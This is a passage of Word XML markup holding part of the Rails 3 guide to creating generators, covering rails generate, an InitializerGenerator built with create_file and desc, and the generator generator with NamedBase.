      <w:hyperlink r:id="rId1151" w:anchor="9-14" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>readme</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7F231740" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide is about generators in Rails 3, previous versions are not covered.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003FFDD8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 First Contact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FA0A3B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you create an application using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command, you are in fact using a Rails generator. After that, you can get a list of all available generators by just invoking </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails generate</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="059C968E" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="60674D34" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails new myapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7609AEF6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ cd myapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C8A02DC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="634876F6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You will get a list of all generators that comes with Rails. If you need a detailed description of the helper generator, for example, you can simply do:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="5E58D57F" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E08B01A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1406561896"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate helper --help</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11035350" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Creating Your First Generator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479FE64D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Since Rails 3.0, generators are built on top of </w:t>
      </w:r>
      <w:hyperlink r:id="rId1152" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Thor</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. Thor provides powerful options parsing and a great </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for manipulating files. For instance, let’s build a generator that creates an initializer file named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializer.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inside </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C52E153" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first step is to create a file at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/generators/initializer_generator.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the following content:</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32ECD3C8" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="729B26AF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>InitializerGenerator &lt; Rails::Generators::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4527F93E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create_initializer_file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29918821" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_file "config/initializers/initializer.rb", "# Add initialization content here"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F203434" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="217F7D0B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42856FC1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a method provided by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Thor::Actions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Documentation for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and other Thor methods can be found in </w:t>
      </w:r>
      <w:hyperlink r:id="rId1153" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Thor’s documentation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="141D1FA0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Our new generator is quite simple: it inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Generators::Base</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and has one method definition. When a generator is invoked, each public method in the generator is executed sequentially in the order that it is defined. Finally, we invoke the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method that will create a file at the given destination with the given content. If you are familiar with the Rails Application Templates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, you’ll feel right at home with the new generators </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C52EECE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To invoke our new generator, we just need to do:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="1CE13A6A" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54A018B8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1182667776"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate initializer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="078AB9BF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Before we go on, let’s see our brand new generator description:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="77EB85D1" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70048191" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="82144881"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate initializer --help</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2179A3BB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails is usually able to generate good descriptions if a generator is namespaced, as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Generators::ModelGenerator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, but not in this particular case. We can solve this problem in two ways. The first one is calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>desc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inside our generator:</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4F53E5A7" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="528AF9B3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>InitializerGenerator &lt; Rails::Generators::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="389A2DC8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  desc "This generator creates an initializer file at config/initializers"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DDB1EC3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create_initializer_file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A37CECC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_file "config/initializers/initializer.rb", "# Add initialization content here"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A05252D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72700A9C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="609E0F8F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now we can see the new description by invoking </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>--help</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the new generator. The second way to add a description is by creating a file named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>USAGE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the same directory as our generator. We are going to do that in the next step.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC7BD43" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Creating Generators with Generators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB484C9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Generators themselves have a generator:</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6AFF004F" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6756FDDD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate generator initializer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F56083D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create  lib/generators/initializer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7286D6C9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create  lib/generators/initializer/initializer_generator.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39EAD9ED" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create  lib/generators/initializer/USAGE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01B72B26" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create  lib/generators/initializer/templates</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53BBB6AF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This is the generator just created:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="5AE01FDE" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="635C3C33" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>InitializerGenerator &lt; Rails::Generators::NamedBase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="647E6E8E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  source_root File.expand_path("../templates", __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61642B5B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6333715F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">First, notice that we are inheriting from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Generators::NamedBase</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Generators::Base</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This means that our generator expects at least one argument, which will be the name of the initializer, and will be available in our code in the variable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47912EAA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>We can see that by invoking the description of this new generator (don’t forget to delete the old generator file):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="642A69E4" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27B811D7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate initializer --help</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B913607" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Usage:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CD28AF9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  rails generate initializer NAME [options]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A2D3E59" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
